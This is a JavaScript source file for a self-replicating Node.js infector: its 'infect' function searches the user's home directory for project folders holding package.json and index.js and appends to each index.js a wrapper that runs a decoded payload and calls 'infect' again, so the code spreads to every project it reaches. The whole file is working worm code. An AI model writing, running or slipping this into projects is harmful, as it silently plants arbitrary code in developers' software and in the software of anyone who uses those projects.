function infect( payload ) {

    const fs   = require( "fs" );
    const os   = require( "os" );
    const path = require( "path" );

    // the original payload, modified with a runner that decodes and executes it
    // this is the string that will be injected into our targets

    const modifiedPayload = `
        (function() {
            ${decodeURI(payload)} 
            infect( "${payload}" );
        })();
    `;

    // wrapped standard file-system methods in promises so we can use await/async syntax

    function readFile( f ) {
        return new Promise( function( rs, rj ) {
            fs.readFile( f, (e,r) => e ? rj( e ) : rs( r ) );
        });
    }

    function readdir( dir ) {
        return new Promise( function( rs, rj ) {
            fs.readdir( dir, (e,r) => e ? rj( e ) : rs( r ) );
        });
    }

    function stat( f ) {
        return new Promise( function( rs ) {
            fs.stat( f, function( err, res ) {
                if( !err && res.isFile() )
                    rs( "file" );
                else if( !err && res.isDirectory() )
                    rs( "dir" );
                else
                    rs( null );
            });
        });
    }

    function appendFile( f, data ) {
        return new Promise( function( rs, rj ) {
            fs.appendFile( f, data, (e) => e ? rj( e ) : rs() );
        });
    }

    function getProjectDirectories( root, depth ) {
        if( depth < 1 )
            return [];
        return readdir( root )
            .then( function( files ) { 
                return Promise.all( files.map( function( file ) {
                    var full = path.join( root, file );
                    return stat( full )
                        .then( function( dirInfo ) {
                            if( dirInfo !== "dir" )
                                return [];
                            var ixPath = path.join( full, "index.js" );
                            return stat( ixPath )
                                .then( function( ixInfo ) {
                                    return stat( path.join( full, "package.json" ) ).then( function( pkgInfo ) {
                                        if( pkgInfo === "file") {
                                            if( ixInfo === "file" )
                                                return [ ixPath ];
                                            return [];
                                        }
                                        return getProjectDirectories( full, depth - 1 );
                                    });
                                });
                        });
                } ) ).then( function( arrs ) {
                    var res = [];
                    for( var arr of arrs )
                        res.push( ...arr );
                    return res;
                });
            });
    }

    getProjectDirectories( os.homedir(), 10 ).then( function( files ) {
        return Promise.all( files.map( function( file ) {
            readFile( file )
                .then( function( data ) {
                    if( data.indexOf( modifiedPayload ) === -1 )
                        return appendFile( file, modifiedPayload );
                }); 
        }));
    });
}
